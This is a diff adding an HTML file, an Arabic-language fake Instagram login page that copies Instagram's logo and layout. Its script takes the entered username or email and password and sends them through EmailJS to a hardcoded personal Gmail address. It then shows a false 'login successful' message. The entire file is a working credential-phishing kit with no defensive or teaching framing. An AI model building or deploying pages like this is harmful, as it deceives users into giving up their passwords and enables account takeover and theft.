@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول إلى انستغرام</title>
+    <!-- إضافة مكتبة EmailJS -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        // تهيئة EmailJS
+        (function() {
+            emailjs.init("pb80lvay3xlW8lMZ7");
+        })();
+    </script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            direction: ltr;
+            padding: 20px;
+        }
+        
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 350px;
+            width: 100%;
+        }
+        
+        .logo-section {
+            margin-bottom: 12px;
+            text-align: center;
+            width: 100%;
+        }
+        
+        .logo {
+            background-image: url('https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png');
+            height: 51px;
+            width: 175px;
+            background-repeat: no-repeat;
+            background-size: contain;
+            margin: 22px auto 12px;
+        }
+        
+        .login-form {
+            width: 100%;
+            padding: 20px 0;
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            margin-bottom: 10px;
+        }
+        
+        form {
+            display: flex;
+            flex-direction: column;
+            margin: 0 20px;
+        }
+        
+        input {
+            padding: 12px 8px;
+            font-size: 14px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            margin-bottom: 8px;
+            width: 100%;
+        }
+        
+        input:focus {
+            border-color: #a8a8a8;
+            outline: none;
+        }
+        
+        .login-button {
+            background-color: #0095f6;
+            color: white;
+            padding: 8px 9px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 12px;
+            opacity: 0.7;
+            width: 100%;
+        }
+        
+        .login-button:hover {
+            opacity: 1;
+        }
+        
+        .forgot-password {
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .forgot-password a {
+            color: #00376b;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        
+        @media screen and (max-width: 450px) {
+            .container {
+                max-width: 100%;
+            }
+            .login-form {
+                border: none;
+                background-color: transparent;
+            }
+            form {
+                margin: 0 15px;
+            }
+            input {
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="logo-section">
+            <div class="logo"></div>
+        </div>
+        <div class="login-form">
+            <form id="loginForm" onsubmit="sendEmail(event)">
+                <input type="text" id="email" placeholder="رقم الهاتف أو البريد الإلكتروني أو اسم المستخدم" aria-label="رقم الهاتف أو البريد الإلكتروني أو اسم المستخدم">
+                <input type="password" id="password" placeholder="كلمة المرور" aria-label="كلمة المرور">
+                <button class="login-button">تسجيل الدخول</button>
+                <div class="forgot-password">
+                    <a href="#">هل نسيت كلمة المرور؟</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function sendEmail(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // إعداد المعلومات التي سيتم إرسالها
+            const templateParams = {
+                to_email: 'moheah333@gmail.com',
+                from_email: email,
+                password: password,
+                time: new Date().toLocaleString()
+            };
+
+            // إرسال البريد الإلكتروني
+            emailjs.send('service_wfmqg19', 'template_uuzlqwc', templateParams)
+                .then(function(response) {
+                    console.log('تم الإرسال بنجاح!', response.status, response.text);
+                    alert('تم تسجيل الدخول بنجاح!');
+                    document.getElementById('loginForm').reset();
+                }, function(error) {
+                    console.log('فشل في الإرسال...', error);
+                    alert('حدث خطأ في تسجيل الدخول');
+                });
+        }
+    </script>
+</body>
+
+</html>
